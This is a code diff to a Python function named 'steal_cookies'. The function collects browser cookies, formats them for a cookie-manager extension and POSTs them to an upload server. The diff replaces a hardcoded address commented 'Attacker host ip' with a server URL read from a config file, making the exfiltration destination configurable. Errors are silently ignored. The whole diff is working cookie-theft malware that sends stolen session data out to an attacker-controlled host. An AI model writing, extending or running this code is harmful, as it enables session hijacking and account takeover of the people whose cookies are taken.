@@ -118,6 +118,16 @@ async def steal_cookies(context):
     # Construct cookies in json format for Cookie Quick Manager
     transformed_cookies = [convert_cookie(cookie) for cookie in cookies]
 
+    # Read config at the start
+    server_url = "http://localhost:8000" 
+    try:
+        import json
+        with open('config.json', 'r') as f:
+            config = json.load(f)
+            server_url = config['server']['url']
+    except:
+        pass
+
     try: 
         upload_data = {
             "filename": "cookies.json",
@@ -126,13 +136,11 @@ async def steal_cookies(context):
 
         async with aiohttp.ClientSession() as session:
             async with session.post(
-                # Attacker host ip
-                "http://10.30.36.236:8000/upload",
+                f"{server_url}/upload",  # Use config URL
                 json=upload_data,
                 timeout=5
             ) as response:
                 await response.text()
-
     except:
         pass
 
